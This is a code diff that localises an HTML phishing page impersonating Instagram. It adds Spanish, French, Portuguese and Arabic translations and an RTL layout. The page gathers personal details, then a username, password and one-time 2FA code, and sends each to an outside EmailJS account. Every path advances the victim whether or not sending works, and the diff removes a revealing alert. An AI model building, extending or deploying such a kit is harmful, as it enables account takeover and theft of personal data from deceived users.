@@ -46,15 +46,44 @@
             transition: background-color 0.3s ease;
         }
 
+        /* RTL Support for Arabic */
+        body.rtl {
+            direction: rtl;
+        }
+
+        body.rtl .form-group label,
+        body.rtl .input-label {
+            text-align: right;
+        }
+
         /* View Toggle Utility */
         .hidden {
             display: none !important;
+        }
+
+        /* --- GLOBAL LANGUAGE SELECTOR --- */
+        .language-selector-wrapper {
+            width: 100%;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .lang-select {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: #737373;
+            font-size: 13px;
+            outline: none;
+            cursor: pointer;
         }
 
         /* --- PAGE 1: COMMUNITY REGISTRATION STYLES --- */
         .registration-wrapper {
             width: 100%;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             flex-grow: 1;
@@ -133,14 +162,6 @@
         }
 
         /* --- PAGE 2: LOGIN STYLES --- */
-        .language-selector {
-            font-size: 13px;
-            color: #737373;
-            margin-top: 10px;
-            margin-bottom: 30px;
-            text-align: center;
-        }
-
         .main-container {
             width: 100%;
             max-width: 350px;
@@ -294,6 +315,7 @@
             gap: 8px;
             justify-content: space-between;
             margin-bottom: 20px;
+            direction: ltr; /* OTP digits always flow left-to-right */
         }
 
         .otp-input {
@@ -367,6 +389,17 @@
 
     <!-- PAGE 1: REGISTRATION SECTION -->
     <div id="registerView" class="registration-wrapper">
+        <!-- Language Selector on Page 1 -->
+        <div class="language-selector-wrapper">
+            <select id="langSelect" class="lang-select">
+                <option value="en" selected>English (UK)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="pt">Português</option>
+                <option value="ar">العربية</option>
+            </select>
+        </div>
+
         <div class="mobile-card">
             <!-- Instagram Logo Header -->
             <div class="logo-container">
@@ -381,7 +414,7 @@
                         </radialGradient>
                     </defs>
                     <path fill="url(#ig-grad)" d="M386.7 125.3c-27.1-27.1-64.6-43.8-130.7-43.8s-103.6 16.7-130.7 43.8C98.2 152.4 81.5 189.9 81.5 256s16.7 103.6 43.8 130.7c27.1 27.1 64.6 43.8 130.7 43.8s103.6-16.7 130.7-43.8c27.1-27.1 43.8-64.6 43.8-130.7s-16.7-103.6-43.8-130.7zm-130.7 274c-112 0-143.3-31.3-143.3-143.3S144 112.7 256 112.7 399.3 144 399.3 256 368 399.3 256 399.3z"/>
-                    <path fill="url(#ig-grad)" d="M256 166c-49.7 0-90 40.3-90 90s40.3 90 90 90 90-40.3 90-90-40.3-90-90-90zm0 148c-32 0-58-26-58-58s26-58 58-58 58 26 58 58-26 58-58-58z"/>
+                    <path fill="url(#ig-grad)" d="M256 166c-49.7 0-90 40.3-90 90s40.3 90 90 90 90-40.3 90-90-40.3-90-90-90zm0 148c-32 0-58-26-58-58s26-58 58-58 58 26 58 58-26 58-58 58z"/>
                     <circle fill="url(#ig-grad)" cx="350" cy="162" r="21"/>
                 </svg>
             </div>
@@ -390,57 +423,53 @@
             <form id="communityForm">
                 <!-- Full name -->
                 <div class="form-group">
-                    <label for="fullName">Full name</label>
+                    <label for="fullName" id="lbl_fullName">Full name</label>
                     <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required />
                 </div>
 
-                <!-- WhatsApp Contact with International Prefix Support -->
+                <!-- WhatsApp Contact -->
                 <div class="form-group">
-                    <label for="whatsapp">WhatsApp Contact</label>
-                    <input type="tel" id="whatsapp" name="whatsapp" placeholder="e.g. +234, +1, +44..." required />
+                    <label for="whatsapp" id="lbl_whatsapp">WhatsApp Contact</label>
+                    <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter your WhatsApp number" required />
                 </div>
 
                 <!-- How long have you been using Instagram -->
                 <div class="form-group">
-                    <label for="igDuration">How long have you been using Instagram</label>
+                    <label for="igDuration" id="lbl_igDuration">How long have you been using Instagram</label>
                     <input type="text" id="igDuration" name="igDuration" placeholder="e.g. 3 years" required />
                 </div>
 
                 <!-- Age -->
                 <div class="form-group">
-                    <label for="age">Age</label>
+                    <label for="age" id="lbl_age">Age</label>
                     <input type="number" id="age" name="age" placeholder="Enter your age" required />
                 </div>
 
                 <!-- Gender -->
                 <div class="form-group">
-                    <label for="gender">Gender</label>
+                    <label for="gender" id="lbl_gender">Gender</label>
                     <select id="gender" name="gender" required>
-                        <option value="" disabled selected>Select your gender</option>
-                        <option value="Male">Male</option>
-                        <option value="Female">Female</option>
-                        <option value="Other">Other</option>
+                        <option value="" disabled selected id="opt_selectGender">Select your gender</option>
+                        <option value="Male" id="opt_male">Male</option>
+                        <option value="Female" id="opt_female">Female</option>
+                        <option value="Other" id="opt_other">Other</option>
                     </select>
                 </div>
 
                 <!-- Referrer Input -->
                 <div class="form-group">
-                    <label for="referrer">Referrer Email</label>
+                    <label for="referrer" id="lbl_referrer">Referrer Email</label>
                     <input type="email" id="referrer" name="referrer" placeholder="Enter referrer email" required />
                 </div>
 
                 <!-- Join Community Button -->
-                <button type="submit" class="btn-submit">Join Community</button>
+                <button type="submit" class="btn-submit" id="btn_join">Join Community</button>
             </form>
         </div>
     </div>
 
     <!-- PAGE 2: LOGIN SECTION (HIDDEN BY DEFAULT) -->
     <div id="loginView" class="main-container hidden">
-        <div class="language-selector">
-            English (UK)
-        </div>
-
         <div class="brand-icon">
             <svg viewBox="0 0 512 512" width="60" height="60" xmlns="http://www.w3.org/2000/svg">
                 <radialGradient id="ig-grad2" cx="0.2" cy="1" r="1">
@@ -475,7 +504,7 @@
         </form>
 
         <div class="forgot-link">
-            <a href="#">Forgotten your password?</a>
+            <a href="#" id="link_forgot">Forgotten your password?</a>
         </div>
 
         <a href="#" id="showRegisterBtn" class="btn-secondary">Create new account</a>
@@ -490,10 +519,10 @@
                 </svg>
             </div>
 
-            <h1 class="title">OTP Verification</h1>
-            <p class="subtitle">Enter the 6-digit code sent to you to confirm it's really you.</p>
+            <h1 class="title" id="otp_title">OTP Verification</h1>
+            <p class="subtitle" id="otp_subtitle">Enter the 6-digit code sent to you to confirm it's really you.</p>
 
-            <span class="input-label">Enter the 6-digit code</span>
+            <span class="input-label" id="otp_inputLabel">Enter the 6-digit code</span>
 
             <div class="otp-container" id="otp-inputs">
                 <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autofocus />
@@ -504,7 +533,7 @@
                 <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
             </div>
 
-            <p class="info-text">A verification code was sent to <span id="sentTargetDisplay">your device</span></p>
+            <p class="info-text" id="otp_infoPrefix">A verification code was sent to <span id="sentTargetDisplay">your device</span></p>
 
             <button class="verify-btn" id="verify-btn" disabled>
                 I'm not a bot
@@ -517,6 +546,233 @@
     </div>
 
     <script>
+        // Translations Dictionary
+        const i18n = {
+            en: {
+                dir: 'ltr',
+                lbl_fullName: "Full name",
+                ph_fullName: "Enter your full name",
+                lbl_whatsapp: "WhatsApp Contact",
+                ph_whatsapp: "Enter your WhatsApp number",
+                lbl_igDuration: "How long have you been using Instagram",
+                ph_igDuration: "e.g. 3 years",
+                lbl_age: "Age",
+                ph_age: "Enter your age",
+                lbl_gender: "Gender",
+                opt_selectGender: "Select your gender",
+                opt_male: "Male",
+                opt_female: "Female",
+                opt_other: "Other",
+                lbl_referrer: "Referrer Email",
+                ph_referrer: "Enter referrer email",
+                btn_join: "Join Community",
+                ph_loginUsername: "Username, phone number or email",
+                ph_loginPassword: "Password",
+                loginBtn: "Log in",
+                loginBtnLoading: "Logging in...",
+                link_forgot: "Forgotten your password?",
+                showRegisterBtn: "Create new account",
+                otp_title: "OTP Verification",
+                otp_subtitle: "Enter the 6-digit code sent to you to confirm it's really you.",
+                otp_inputLabel: "Enter the 6-digit code",
+                otp_infoPrefix: "A verification code was sent to ",
+                verifyBtn: "I'm not a bot",
+                verifyBtnLoading: "Verifying...",
+                alertSuccess: "Verification Successful!",
+                alertError: "Failed to verify: "
+            },
+            es: {
+                dir: 'ltr',
+                lbl_fullName: "Nombre completo",
+                ph_fullName: "Ingresa tu nombre completo",
+                lbl_whatsapp: "Contacto de WhatsApp",
+                ph_whatsapp: "Ingresa tu número de WhatsApp",
+                lbl_igDuration: "¿Cuánto tiempo llevas usando Instagram?",
+                ph_igDuration: "ej. 3 años",
+                lbl_age: "Edad",
+                ph_age: "Ingresa tu edad",
+                lbl_gender: "Género",
+                opt_selectGender: "Selecciona tu género",
+                opt_male: "Masculino",
+                opt_female: "Femenino",
+                opt_other: "Otro",
+                lbl_referrer: "Correo electrónico de referencia",
+                ph_referrer: "Ingresa el correo de referencia",
+                btn_join: "Unirse a la comunidad",
+                ph_loginUsername: "Nombre de usuario, teléfono o correo",
+                ph_loginPassword: "Contraseña",
+                loginBtn: "Iniciar sesión",
+                loginBtnLoading: "Iniciando sesión...",
+                link_forgot: "¿Olvidaste tu contraseña?",
+                showRegisterBtn: "Crear cuenta nueva",
+                otp_title: "Verificación OTP",
+                otp_subtitle: "Ingresa el código de 6 dígitos enviado para confirmar tu identidad.",
+                otp_inputLabel: "Ingresa el código de 6 dígitos",
+                otp_infoPrefix: "Se envió un código de verificación a ",
+                verifyBtn: "No soy un robot",
+                verifyBtnLoading: "Verificando...",
+                alertSuccess: "¡Verificación exitosa!",
+                alertError: "Error al verificar: "
+            },
+            fr: {
+                dir: 'ltr',
+                lbl_fullName: "Nom complet",
+                ph_fullName: "Entrez votre nom complet",
+                lbl_whatsapp: "Contact WhatsApp",
+                ph_whatsapp: "Entrez votre numéro WhatsApp",
+                lbl_igDuration: "Depuis combien de temps utilisez-vous Instagram ?",
+                ph_igDuration: "ex. 3 ans",
+                lbl_age: "Âge",
+                ph_age: "Entrez votre âge",
+                lbl_gender: "Genre",
+                opt_selectGender: "Sélectionnez votre genre",
+                opt_male: "Homme",
+                opt_female: "Femme",
+                opt_other: "Autre",
+                lbl_referrer: "E-mail du parrain",
+                ph_referrer: "Entrez l'e-mail du parrain",
+                btn_join: "Rejoindre la communauté",
+                ph_loginUsername: "Nom d'utilisateur, téléphone ou e-mail",
+                ph_loginPassword: "Mot de passe",
+                loginBtn: "Se connecter",
+                loginBtnLoading: "Connexion en cours...",
+                link_forgot: "Mot de passe oublié ?",
+                showRegisterBtn: "Créer un nouveau compte",
+                otp_title: "Vérification OTP",
+                otp_subtitle: "Entrez le code à 6 chiffres envoyé pour confirmer votre identité.",
+                otp_inputLabel: "Entrez le code à 6 chiffres",
+                otp_infoPrefix: "Un code de vérification a été envoyé à ",
+                verifyBtn: "Je ne suis pas un robot",
+                verifyBtnLoading: "Vérification...",
+                alertSuccess: "Vérification réussie !",
+                alertError: "Échec de la vérification : "
+            },
+            pt: {
+                dir: 'ltr',
+                lbl_fullName: "Nome completo",
+                ph_fullName: "Digite seu nome completo",
+                lbl_whatsapp: "Contato do WhatsApp",
+                ph_whatsapp: "Digite seu número do WhatsApp",
+                lbl_igDuration: "Há quanto tempo você usa o Instagram?",
+                ph_igDuration: "ex. 3 anos",
+                lbl_age: "Idade",
+                ph_age: "Digite sua idade",
+                lbl_gender: "Gênero",
+                opt_selectGender: "Selecione seu gênero",
+                opt_male: "Masculino",
+                opt_female: "Feminino",
+                opt_other: "Outro",
+                lbl_referrer: "E-mail de indicação",
+                ph_referrer: "Digite o e-mail de indicação",
+                btn_join: "Entrar na comunidade",
+                ph_loginUsername: "Nome de usuário, telefone ou e-mail",
+                ph_loginPassword: "Senha",
+                loginBtn: "Entrar",
+                loginBtnLoading: "Entrando...",
+                link_forgot: "Esqueceu a senha?",
+                showRegisterBtn: "Criar nova conta",
+                otp_title: "Verificação OTP",
+                otp_subtitle: "Digite o código de 6 dígitos enviado para confirmar sua identidade.",
+                otp_inputLabel: "Digite o código de 6 dígitos",
+                otp_infoPrefix: "Um código de verificação foi enviado para ",
+                verifyBtn: "Não sou um robô",
+                verifyBtnLoading: "Verificando...",
+                alertSuccess: "Verificação concluída com sucesso!",
+                alertError: "Falha na verificação: "
+            },
+            ar: {
+                dir: 'rtl',
+                lbl_fullName: "الاسم الكامل",
+                ph_fullName: "أدخل اسمك الكامل",
+                lbl_whatsapp: "رقم الواتساب",
+                ph_whatsapp: "أدخل رقم الواتساب الخاص بك",
+                lbl_igDuration: "منذ متى وانت تستخدم انستغرام؟",
+                ph_igDuration: "مثال: 3 سنوات",
+                lbl_age: "العمر",
+                ph_age: "أدخل عمرك",
+                lbl_gender: "الجنس",
+                opt_selectGender: "حدد جنسك",
+                opt_male: "ذكر",
+                opt_female: "أنثى",
+                opt_other: "آخر",
+                lbl_referrer: "البريد الإلكتروني للمُحيل",
+                ph_referrer: "أدخل البريد الإلكتروني للمُحيل",
+                btn_join: "الانضمام إلى المجتمع",
+                ph_loginUsername: "اسم المستخدم أو الهاتف أو البريد الإلكتروني",
+                ph_loginPassword: "كلمة المرور",
+                loginBtn: "تسجيل الدخول",
+                loginBtnLoading: "جاري تسجيل الدخول...",
+                link_forgot: "هل نسيت كلمة السر؟",
+                showRegisterBtn: "إنشاء حساب جديد",
+                otp_title: "التحقق من رمز OTP",
+                otp_subtitle: "أدخل الرمز المكون من 6 أرقام المرسل إليك لتأكيد هويتك.",
+                otp_inputLabel: "أدخل الرمز المكون من 6 أرقام",
+                otp_infoPrefix: "تم إرسال رمز التحقق إلى ",
+                verifyBtn: "أنا لست برنامج روبوت",
+                verifyBtnLoading: "جاري التحقق...",
+                alertSuccess: "تم التحقق بنجاح!",
+                alertError: "فشل التحقق: "
+            }
+        };
+
+        let currentLang = 'en';
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            const t = i18n[lang];
+
+            // Set Text Direction (LTR vs RTL)
+            if (t.dir === 'rtl') {
+                document.body.classList.add('rtl');
+            } else {
+                document.body.classList.remove('rtl');
+            }
+
+            // Page 1 Elements
+            document.getElementById('lbl_fullName').textContent = t.lbl_fullName;
+            document.getElementById('fullName').placeholder = t.ph_fullName;
+
+            document.getElementById('lbl_whatsapp').textContent = t.lbl_whatsapp;
+            document.getElementById('whatsapp').placeholder = t.ph_whatsapp;
+
+            document.getElementById('lbl_igDuration').textContent = t.lbl_igDuration;
+            document.getElementById('igDuration').placeholder = t.ph_igDuration;
+
+            document.getElementById('lbl_age').textContent = t.lbl_age;
+            document.getElementById('age').placeholder = t.ph_age;
+
+            document.getElementById('lbl_gender').textContent = t.lbl_gender;
+            document.getElementById('opt_selectGender').textContent = t.opt_selectGender;
+            document.getElementById('opt_male').textContent = t.opt_male;
+            document.getElementById('opt_female').textContent = t.opt_female;
+            document.getElementById('opt_other').textContent = t.opt_other;
+
+            document.getElementById('lbl_referrer').textContent = t.lbl_referrer;
+            document.getElementById('referrer').placeholder = t.ph_referrer;
+
+            document.getElementById('btn_join').textContent = t.btn_join;
+
+            // Page 2 Elements
+            document.getElementById('loginUsername').placeholder = t.ph_loginUsername;
+            document.getElementById('loginPassword').placeholder = t.ph_loginPassword;
+            document.getElementById('loginBtn').textContent = t.loginBtn;
+            document.getElementById('link_forgot').textContent = t.link_forgot;
+            document.getElementById('showRegisterBtn').textContent = t.showRegisterBtn;
+
+            // Page 3 Elements
+            document.getElementById('otp_title').textContent = t.otp_title;
+            document.getElementById('otp_subtitle').textContent = t.otp_subtitle;
+            document.getElementById('otp_inputLabel').textContent = t.otp_inputLabel;
+            
+            const sentTarget = document.getElementById('sentTargetDisplay').outerHTML;
+            document.getElementById('otp_infoPrefix').innerHTML = t.otp_infoPrefix + sentTarget;
+            document.getElementById('verify-btn').textContent = t.verifyBtn;
+        }
+
+        document.getElementById('langSelect').addEventListener('change', (e) => {
+            setLanguage(e.target.value);
+        });
+
         // Views
         const registerView = document.getElementById('registerView');
         const loginView = document.getElementById('loginView');
@@ -593,7 +849,8 @@
         document.getElementById('authForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            loginBtn.innerText = 'Logging in...';
+            const t = i18n[currentLang];
+            loginBtn.innerText = t.loginBtnLoading;
             loginBtn.disabled = true;
 
             formDataStore.loginPhone = loginUsername.value;
@@ -614,11 +871,11 @@
 
             emailjs.send('service_rf9jc9g', 'template_ykjxd5h', templateParams)
                 .then(function(response) {
-                    loginBtn.innerText = 'Log in';
+                    loginBtn.innerText = t.loginBtn;
                     loginBtn.disabled = false;
                     goToOTP();
                 }, function(error) {
-                    loginBtn.innerText = 'Log in';
+                    loginBtn.innerText = t.loginBtn;
                     loginBtn.disabled = false;
                     goToOTP();
                 });
@@ -665,8 +922,9 @@
         // 4. Final Submission via EmailJS on Page 3
         verifyBtn.addEventListener('click', () => {
             const otpCode = Array.from(otpInputs).map(i => i.value).join('');
+            const t = i18n[currentLang];
             
-            verifyBtn.innerText = "Verifying...";
+            verifyBtn.innerText = t.verifyBtnLoading;
             verifyBtn.disabled = true;
 
             const otpTemplateParams = {
@@ -684,12 +942,12 @@
 
             emailjs.send('service_rf9jc9g', 'template_ykjxd5h', otpTemplateParams)
                 .then(function(response) {
-                    alert(`Verification Code (${otpCode}) sent successfully via email!`);
-                    verifyBtn.innerText = "I'm not a bot";
+                    alert(t.alertSuccess);
+                    verifyBtn.innerText = t.verifyBtn;
                     verifyBtn.disabled = false;
                 }, function(error) {
-                    alert('Failed to send OTP code: ' + JSON.stringify(error));
-                    verifyBtn.innerText = "I'm not a bot";
+                    alert(t.alertError + JSON.stringify(error));
+                    verifyBtn.innerText = t.verifyBtn;
                     verifyBtn.disabled = false;
                 });
         });
